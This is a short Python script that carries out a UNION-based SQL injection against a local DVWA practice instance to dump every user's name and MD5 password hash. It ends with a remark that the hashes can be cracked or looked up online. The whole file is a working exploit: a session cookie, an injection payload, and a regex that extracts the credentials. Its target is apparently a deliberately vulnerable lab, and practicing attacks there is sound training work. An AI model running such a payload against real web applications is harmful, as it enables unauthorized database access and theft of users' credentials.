
import requests
import re

s = requests.Session()
s.cookies.update({'PHPSESSID': '9f8c8our5hpn5aqrjdbg4k9er5', 'security': 'low'})

url = "http://localhost:28080/vulnerabilities/sqli/"

# Dump all users with their MD5 password hashes
payload = "' OR 1=1 UNION SELECT user, password FROM users#"
data = {"id": payload, "Submit": "Submit"}

r = s.post(url, data=data)

# Extract ALL ID/First name/Surname lines
entries = re.findall(r'ID:\s*(.*?)<br\s*/?>\s*First name:\s*(.*?)<br\s*/?>\s*Surname:\s*(.*?)(?:<br|$)', r.text, re.DOTALL)
print(f"[*] Found {len(entries)} entries:\n")
for entry in entries:
    id_val, first, last = [e.strip() for e in entry]
    print(f"  user={first}, password_hash={last}")

print("\n[+] Extracted all DVWA user credentials via SQL injection!")
print("[*] These MD5 hashes can be cracked or looked up online.")

